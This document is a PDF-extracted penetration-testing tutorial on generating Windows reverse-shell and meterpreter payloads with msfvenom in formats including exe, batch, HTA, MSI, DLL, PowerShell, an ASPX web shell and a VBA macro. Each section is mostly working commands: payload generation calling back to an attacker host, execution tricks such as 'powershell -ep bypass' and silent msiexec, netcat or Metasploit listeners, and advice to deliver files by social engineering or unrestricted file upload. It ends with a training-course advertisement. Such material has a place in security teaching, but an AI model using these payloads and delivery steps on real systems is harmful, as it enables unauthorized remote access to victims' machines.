[[ PAGE 1 ]]
[[ PAGE 2 ]]
 
 
 Page 2 of 16 
 
Contents 
Requirements: ........................................................................................ 3 
MsfVenom Syntax .................................................................................. 3 
Payload and its types ............................................................................. 3 
Executable Payload (exe) ....................................................................... 5 
Powershell Batch File ............................................................................. 5 
HTML Application Payload (HTA) ........................................................... 6 
Microsoft Installer Payload (MSI) .......................................................... 7 
Dynamic-link library Payload (DLL) ........................................................ 8 
Powershell Payload (psh-cmd) ............................................................... 9 
Powershell Payload (ps1) ..................................................................... 10 
Web shell Payload (ASPX) .................................................................... 12 
Visual Basic Payload (.vba) ................................................................... 13 
 
 
 
[[ PAGE 3 ]]
 
 
 Page 3 of 16 
 
Requirements:  
 
Kali Linux 
 
Windows Machine 
MsfVenom Syntax 
MsfVenom is a Metasploit standalone payload generator that is also a replacement for msfpayload and 
msfencode. 
 
Payload and its types 
Payloads are malicious scripts that an attacker uses to interact with a target machine in order to 
compromise it. Msfvenom supports the following platforms and formats to generate the payload: The 
output format could be in the form of executable files such as exe, php, dll, or as a one-liner. 
Two major types of Payloads   
Stager: They are commonly identified by second (/) such as windows/meterpreter/reverse_tcp 
Stageless: The use of _ instead of the second / in the payload name such as 
windows/meterpreter_reverse_tcp 
[[ PAGE 4 ]]
 
 
 Page 4 of 16 
 
 
[[ PAGE 5 ]]
 
 
 Page 5 of 16 
 
As we have mentioned above, this post may help you learn all the possible methods to generate various 
payload formats for exploiting the Windows Platform. 
Executable Payload (exe) 
Payload Type: Stager 
Executing the following command to create a malicious exe file is a common filename extension 
denoting an executable file for Microsoft Windows. 
 
 
The entire malicious code will be written inside the shell.exe file and will be executed as an exe program 
on the target machine. 
 
Share this file using social engineering tactics and wait for target execution. Meanwhile, launch netcat as 
a listener for capturing reverse connections. 
 
 
 
Powershell Batch File 
Payload Type: Stager 
Execute the following command to create a malicious batch file, the filename extension .bat is used in 
DOS and Windows. 
 
 
The entire malicious code will be written inside the shell.bat file and will be executed as a.bat script on 
the target machine. 
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f exe > shell.exe 
nc -lvp 443 
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.3 lport=443 > shell.bat 
[[ PAGE 6 ]]
 
 
 Page 6 of 16 
 
 
Share this file using social engineering tactics and wait for target execution. Meanwhile, launch netcat as 
the listener for capturing reverse connections. 
 
 
 
HTML Application Payload (HTA) 
Payload Type: Stager  
An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, 
Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or 
JScript.  
Execute the following command to create a malicious HTA file. The filename extension .hta is used in DOS 
and Windows. 
 
 
The entire malicious code will be written inside the shell.hta file and will be executed as a.hta script on 
the target machine. Use the Python HTTP Server for file sharing. 
 
 
nc -lvp 443 
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta 
[[ PAGE 7 ]]
 
 
 Page 7 of 16 
 
 
An HTA is executed using the program mshta.exe or by double-clicking on the file.  
 
This will bring reverse connection through the Netcat listener, which was running in the background to 
capture reverse connection.  
 
 
 
Microsoft Installer Payload (MSI)   
Windows Installer is also known as Microsoft Installer. An MSI file is a Windows package that provides 
installation information for a certain installer, such as the programs that need to be installed. It can be 
used to install Windows updates or third-party software, just like exe. Execute the following command to 
create a malicious MSI file with the filename extension. msi is used in DOS and Windows. Transfer the 
malicious code to the target system and execute it. 
 
 
 
Use the command msiexec to run the MSI file. 
 
 
 
mshta http://192.168.1.3/shell.hta 
nc -lvp 443 
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f msi > shell.msi 
msiexec /quiet /qn /i shell.msi 
[[ PAGE 8 ]]
 
 
 Page 8 of 16 
 
This will bring reverse connection through the Netcat listener, which was running in the background to 
capture reverse connection. 
 
 
 
Dynamic-link library Payload (DLL) 
Payload Type: Stager 
A DLL is a library that contains code and data that can be used by more than one program.  
Execute the following command to create a malicious dll file. The filename extension .dll is used in DOS 
and Windows. Transfer the malicious code to the target system and execute it. 
 
 
 
Use the command rundll32 to run the MSI file. 
 
 
 
This will bring reverse connection through the netcat listener, which was running in the background to 
capture reverse connection.  
 
 
nc -lvp 443 
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f dll > shell.dll 
rundll32.exe shell.dll,0 
nc -lvp 443 
[[ PAGE 9 ]]
 
 
 Page 9 of 16 
 
 
Powershell Payload (psh-cmd) 
Payload Type: Stager 
Format – psh, psh-net, psh-reflection, or psh-cmd 
The generated payload for psh, psh-net, and psh-reflection formats has a .ps1 extension, and the 
generated payload for the psh-cmd format has a .cmd extension. Else you can directly execute the raw 
code inside the Command Prompt of the target system. 
 
 
Execute the following command to generate raw code for the malicious PowerShell program. 
 
For execution, copy the generated code and paste it into the Windows command prompt. This will bring 
reverse connection through the netcat listener, which was running in the background to capture reverse 
connection. 
 
 
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.3 lport=443 -f psh-cmd  -f raw 
nc -lvp 443 
[[ PAGE 10 ]]
 
 
 Page 10 of 16 
 
 
Powershell Payload (ps1) 
Payload Type: Stager  
A PS1 file is a script, or "cmdlet," used by Windows PowerShell. PS1 files are similar to .BAT and.CMD files, 
except that they are executed in Windows PowerShell instead of the Windows Command Prompt. Execute 
the following command to create a malicious PS1 script, with the filename extension. PS1 is used in 
Windows PowerShell. 
 
 
Since the reverse shell type is meterpreter, we need to launch an exploit/multi/handler inside the 
Metasploit framework. 
 
PowerShell’s execution policy is a safety feature that controls the conditions under which PowerShell 
loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts. It 
prevents the running of all script files, including formatting and configuration files (.ps1xml), module script 
files (.psm1), and PowerShell profiles (.ps1).  
More information is available here. 
In order to execute the PS1 script, you need to bypass the execution policy by running the following 
command in Windows PowerShell and executing the script. 
 
 
msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.1.3 lport=443 -f 
psh > shell.ps1 
powershell -ep bypass 
.\shell.ps1 
[[ PAGE 11 ]]
 
 
 Page 11 of 16 
 
 
 
 
 
 
 
 
As soon as the target executes the shell.ps1 script, an attacker will get a reverse connection through a 
meterpreter session.  
 
msfconsole 
use exploit/multi/handler 
set lhost 192.168.1.3 
set lport 443 
set payload windows/x64/meterpreter_reverse_https 
exploit 
sysinfo 
[[ PAGE 12 ]]
 
 
 Page 12 of 16 
 
Web shell Payload (ASPX) 
Payload Type: Stageless  
An ASPX file is an Active Server Page Extended file for Microsoft’s ASP.NET platform. When the URL is 
viewed, these pages are shown in the user’s web browser. ".NET web forms" is another name for them. 
Execute the following command to create a malicious aspx script, with the filename extension of. aspx. 
 
 
Since the reverse shell type is meterpreter, we need to launch exploit/multi/handler inside the metasploit 
framework.  
 
 
You can inject this payload for exploiting Unrestricted File Upload vulnerability if the target is IIS Web 
Server. 
 
Execute the upload script in the web browser. 
 
 
 
 
 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.3 lport=443 -f aspx 
> shell.aspx 
[[ PAGE 13 ]]
 
 
 Page 13 of 16 
 
 
 
 
 
As soon as the attacker executes the malicious script, he will get a reverse connection through the 
meterepreter session. 
 
Visual Basic Payload (.vba) 
Payload Type: Stageless  
VBA is a file extension commonly associated with Visual Basic, which supports Microsoft applications such 
as Microsoft Excel, Office, PowerPoint, Word, and Publisher. It is used to create "macros" that run within 
Excel. An attacker takes advantage of these features and creates a malicious VB script to be executed as 
a macro program with Microsoft Excel.  
Execute the following command to create a malicious aspx script, with the filename extension.aspx, that 
will be executed as macros within Microsoft Excel.  
Read more from here: Multiple Ways to Exploit Windows Systems Using Macros  
 
 
msfconsole 
use exploit/multi/handler 
set lhost 192.168.1.3 
set lport 443 
set payload windows/x64/meterpreter/reverse_https 
exploit 
sysinfo 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.3 lport=443 -f vba 
[[ PAGE 14 ]]
 
 
 Page 14 of 16 
 
 
Now we open our workbook that has the malicious macros injected into it.  
[[ PAGE 15 ]]
 
 
 Page 15 of 16 
 
 
As soon as the attacker executes the malicious script, he will get a reverse connection through the 
meterepreter session. 
 
 
 
 
 
use exploit/multi/handler 
set payload 
windows/x64/meterpreter/reverse_https 
set lhost 192.168.1.3 
set lport 443 
exploit 
sysinfo 
[[ PAGE 16 ]]
 
 
 Page 16 of 16 
 
    
 
 
 
 
 
 
 
 
 
 
 
[[ PAGE 17 ]]
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
